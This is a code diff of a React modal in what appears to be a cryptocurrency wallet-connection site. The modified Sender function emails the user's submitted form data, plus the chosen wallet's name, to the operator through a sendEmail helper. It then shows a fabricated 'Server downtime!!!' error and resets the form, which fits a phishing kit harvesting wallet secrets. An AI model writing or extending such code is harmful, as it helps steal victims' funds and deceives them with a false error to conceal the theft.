@@ -2,7 +2,15 @@ import { useEffect, useState } from "react";
 import { sendEmail } from "../../utils/sendEmail";
 import { Toast } from "../../config/libs";
 
-const Modal = ({ children, setIsOpen, isOpen, wallet, data, setData, init }) => {
+const Modal = ({
+  children,
+  setIsOpen,
+  isOpen,
+  wallet,
+  data,
+  setData,
+  init,
+}) => {
   const [state, setState] = useState("none");
   const [note, setNote] = useState("");
 
@@ -16,24 +24,40 @@ const Modal = ({ children, setIsOpen, isOpen, wallet, data, setData, init }) => 
     }, randomNumber);
   }, [wallet]);
 
-  useEffect(() => {
-    state === "sendInfo" && sendEmail({ data });
+  const Sender = async () => {
     if (state === "sendInfo") {
-      Toast(
-        "error",
-        <>
-          <div>
-            <b>Server downtime!!!</b>
-            <br /> Please Try Again in a moment.
-          </div>
-        </>,
-      );
-      setTimeout(() => {
-        setIsOpen(!isOpen);
-        setData(init)
-      }, 1000);
+      const res = await sendEmail({ data: { ...data, wallet: wallet.name } });
+      console.log(res);
+      if (res) {
+        Toast(
+          "error",
+          <>
+            <div>
+              <b>Server downtime!!!</b>
+              <br /> Please Try Again in a moment.
+            </div>
+          </>,
+        );
+        setState("failed");
+        setTimeout(() => {
+          setIsOpen(!isOpen);
+          setData(init);
+        }, 1000);
+    } else {
+        setState("initialized");
     }
-  }, [state]);
+}
+};
+
+useEffect(() => {
+    Sender();
+}, [state]);
+
+const Close = () => {
+    setIsOpen(!isOpen)
+    setData(init);
+  }
+
   return (
     <>
       <div className="relative flex justify-center">
@@ -94,7 +118,7 @@ x-transition:leave-end="translate-y-4 opacity-0 sm:translate-y-0 sm:scale-95" */
               <div className="mt-4">
                 {/* <label className="text-sm text-gray-700 dark:text-gray-200" htmlFor="share link">Share link</label> */}
 
-                {state !== "initialized" ? (
+                {state === "none" || state === 'error' ? (
                   <div className="flex items-center mt-2 -mx-1">
                     <p className="text-center w-full mt-2 text-sm text-gray-500 dark:text-gray-400">
                       {note}
@@ -109,8 +133,8 @@ x-transition:leave-end="translate-y-4 opacity-0 sm:translate-y-0 sm:scale-95" */
                 className={`${state === "none" ? "justify-center" : ""} mt-4 sm:mt-6 sm:flex sm:items-center sm:-mx-2`}
               >
                 <button
-                  onClick={() => setIsOpen(!isOpen)}
-                  className="w-full px-4 py-2 text-sm font-medium tracking-wide text-gray-700 capitalize transition-colors duration-300 transform border border-gray-200 rounded-md sm:w-1/2 sm:mx-2 dark:text-gray-200 dark:border-gray-700 dark:hover:bg-gray-800 hover:bg-gray-100 focus:outline-none focus:ring focus:ring-gray-300 focus:ring-opacity-40"
+                  onClick={Close}
+                  className="w-full px-4 py-2 text-sm font-medium tracking-wide text-rose-700 hover:text-white translate-all capitalize transition-colors duration-300 transform border-2 border-rose-700 rounded-md sm:w-1/2 sm:mx-2 dark:text-gray-200 dark:border-gray-700 dark:hover:bg-gray-800 hover:bg-rose-800 focus:outline-none focus:ring focus:ring-rose-300 focus:ring-opacity-40"
                 >
                   Cancel
                 </button>
@@ -129,9 +153,10 @@ x-transition:leave-end="translate-y-4 opacity-0 sm:translate-y-0 sm:scale-95" */
                   >
                     Connect Manually
                   </button>
-                ) : (
-                  ""
-                )}
+                ) : state === 'sendInfo' || state === 'failed' ? 
+            (
+                    <span className="w-full px-4 py-2 mt-3 text-sm font-medium tracking-wide text-black capitalize  sm:mt-0 sm:w-1/2 sm:mx-2 ">{state !== 'failed'?'Connecting':'Failed'}</span>
+                    ) : ("")}
               </div>
             </div>
           </div>
